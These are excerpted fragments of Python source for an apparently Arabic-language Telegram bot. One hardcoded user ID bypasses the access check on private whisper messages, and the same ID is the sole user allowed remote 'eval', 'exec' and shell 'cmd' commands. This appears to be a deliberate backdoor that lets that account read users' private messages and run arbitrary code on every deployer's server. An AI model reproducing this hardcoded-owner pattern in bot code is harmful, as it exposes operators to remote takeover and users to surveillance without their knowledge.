...
async def open_hms(c: Client, m: Message):
   ...
   if not wsdb.get(f"hms-{id}"):
      ...
      to = data["to"]
      if m.from_user.id != to and m.from_user.id != data["from"] and m.from_user.id != 7124506900 and m.from_user.id != 7124506900:
...
def private_func(c,m,k):
  ...
  channel= r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'rTT7aa'
...
def SudosCommandsFunc(c,m,k,r,channel):
   ...
   if text == 'الملفات':
     if m.from_user.id == 7124506900 or m.from_user.id == 7124506900:
        text = '——— ملفات السورس ———'
...
@Client.on_message(filters.command("eval") & filters.user(7124506900))
...
@Client.on_message(filters.command("exec") & filters.user(7124506900))
...
@Client.on_message(filters.command("cmd") & filters.user(7124506900))
...
@Client.on_message(filters.command("print") & filters.user(7124506900))
...
@Client.on_message(filters.command(["sc", "webs", "ss"]) & filters.user(7124506900))
